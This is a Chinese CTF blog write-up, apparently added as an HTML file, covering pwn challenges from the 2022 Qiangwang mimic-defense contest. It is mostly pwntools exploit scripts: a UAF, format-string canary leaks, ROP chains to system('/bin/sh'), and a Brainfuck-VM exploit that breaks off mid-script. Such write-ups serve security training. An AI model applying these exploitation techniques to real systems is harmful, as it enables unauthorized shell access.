@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="7r1p13J">
+
+
+
+
+
+<title>“强网”拟态防御国际精英挑战赛 | Hexo</title>
+
+
+
+    <link rel="icon" href="/github-11-48.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Links</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">“强网”拟态防御国际精英挑战赛</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 6, 2022&nbsp;&nbsp;18:37:33</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>周末没啥时间，中午起床之后看了下题，就看了个下午，写了几道吧，队友也都在摆烂（，隔壁n1ctf pwn也全是零解）</p>
+<p>做了点签到，剩下的题就没看了，很久没打ctf了，就当随便练手了&#x3D; &#x3D;</p>
+</blockquote>
+<h2 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h2><p>存在UAF，覆盖函数指针即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn2-1&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;172.52.56.10&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tips</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1237)&#x27;) # 1237   14b0</span></span><br><span class="line">tips()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11f0</span></span><br><span class="line">success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]+pie_base</span><br><span class="line">magic=pie_base+<span class="number">0x1B70</span> </span><br><span class="line">flag=<span class="number">0x2073</span>+pie_base</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000001df3</span>+pie_base</span><br><span class="line">ret=<span class="number">0x000000000000101a</span>+pie_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x10,p64(magic)*2)</span></span><br><span class="line"><span class="comment">#add(0x20,&#x27;aaaa&#x27;)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>普通的签到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;172.52.56.27&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to mimic world,try something\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xa94</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">system=pie_base+<span class="number">0x870</span></span><br><span class="line">pop_rdi=pie_base+<span class="number">0xc73</span></span><br><span class="line">binsh=pie_base+<span class="number">0x202068</span></span><br><span class="line">ret=pie_base+<span class="number">0x0000000000000821</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000000c6c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c6e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c70 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c72 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c6b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c6f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000930 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c73 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c71 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000c6d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000821 : ret</span></span><br><span class="line"><span class="string">0x0000000000000400 : ret 0</span></span><br><span class="line"><span class="string">0x0000000000000862 : ret 0x2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span>+p64(canary)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)+p64(pop_rdi)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn1-1"><a href="#pwn1-1" class="headerlink" title="pwn1-1"></a>pwn1-1</h2><p>加了点格式化字符串的签到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn1-1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;172.52.56.149&#x27;,9999)</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0x1423)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to mimic world,try something\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x12a0</span></span><br><span class="line">system=pie_base+<span class="number">0x1040</span></span><br><span class="line">binsh=pie_base+<span class="number">0x4050</span></span><br><span class="line">pop_rdi=pie_base+<span class="number">0x0000000000001943</span></span><br><span class="line">ret=pie_base+<span class="number">0x000000000000101a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000193c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000193e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000001940 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000001942 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000193b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000193f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000001163 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000001943 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000001941 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000193d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000101a : ret</span></span><br><span class="line"><span class="string">0x0000000000001202 : ret 0x2d</span></span><br><span class="line"><span class="string">0x0000000000001072 : ret 0x2f</span></span><br><span class="line"><span class="string">0x00000000000011cd : ret 0xe083</span></span><br><span class="line"><span class="string">0x00000000000011c7 : ret 0xea83</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;You will find some tricks\n&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x50</span></span><br><span class="line">temp=(rbp-<span class="number">0x11</span>)&amp;<span class="number">0xff</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line">success(<span class="built_in">hex</span>(temp))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(temp).encode()+<span class="string">b&#x27;c%34$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(rbp)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rbp-<span class="number">0xf0</span>)+p64(rbp-<span class="number">0x100</span>)+p64(rbp+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><p>一道其实挺简单的vm pwn题，但做着的时候出现了点问题，getshell 打不通，最后改成orw了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;172.52.56.73&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> line  CODE  JT   JF      K</span></span><br><span class="line"><span class="string">=================================</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x15 0x00 0x02 0x00000000  if (A != read) goto 0006</span></span><br><span class="line"><span class="string"> 0004: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span></span><br><span class="line"><span class="string"> 0005: 0x25 0x01 0x00 0x00000001  if (A &gt; 0x1) goto 0007</span></span><br><span class="line"><span class="string"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1434)&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;BF_PARSER&gt;&gt;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">switch ( *((_WORD *)&amp;op_addr + 2 * v1) )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// v1== op_index  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+ = 3   :++v3[i]</span></span><br><span class="line"><span class="string">, = 6   :read(0,&amp;v3[i],1)</span></span><br><span class="line"><span class="string">- = 4   :--v3[i]</span></span><br><span class="line"><span class="string">. = 5   :write(0,&amp;v3[i],1)</span></span><br><span class="line"><span class="string">&lt; = 2   :--i</span></span><br><span class="line"><span class="string">&gt; = 1   : ++i </span></span><br><span class="line"><span class="string">[ = 7   : if(!v3[i]) v1 = word_4062[2 * v1];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    v2 = dword_8460++;</span></span><br><span class="line"><span class="string">    word_8060[v2] = v4; //op_idx</span></span><br><span class="line"><span class="string">    goto LABEL_16;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">] = 8   : if(v3[i])  v1 = word_4062[2 * v1];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    v5 = word_8060[--dword_8460]; // the op_idx  of &#x27;[&#x27; </span></span><br><span class="line"><span class="string">    word_4062[2 * v4] = v5;//op_idx</span></span><br><span class="line"><span class="string">    word_4062[2 * v5] = v4;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">        v1++ </span></span><br><span class="line"><span class="string">        or </span></span><br><span class="line"><span class="string">        return </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;&gt;&#x27;</span>*<span class="number">0x238</span>+<span class="string">b&#x27;.&gt;&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;.&#x27;</span>+<span 